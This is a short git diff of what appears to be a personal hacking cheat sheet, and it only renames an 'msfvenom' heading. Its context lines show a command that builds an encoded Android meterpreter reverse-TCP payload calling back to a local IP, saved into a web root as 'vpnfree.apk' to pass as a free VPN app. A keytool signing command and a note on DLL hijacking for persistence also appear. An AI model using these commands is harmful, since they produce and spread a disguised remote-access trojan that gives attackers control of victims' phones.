@@ -78,7 +78,7 @@
     - 596 is PID of service.exe - DLL Hijack for persistant
 
 
-## msfvenom
+## msfvenom (Android)
 - Create malware
   - ```msfvenum -p android/meterpreter/reverse_tcp -e shikata-ga-nai lhost=192.168.1.18 lport=443 R > /var/www/html/vpnfree.apk``` 
   - ```Keytool -genkey -v -keystore nss.keystore -alias nss -keyalg RSA -keysize 2048 -validity 100000```
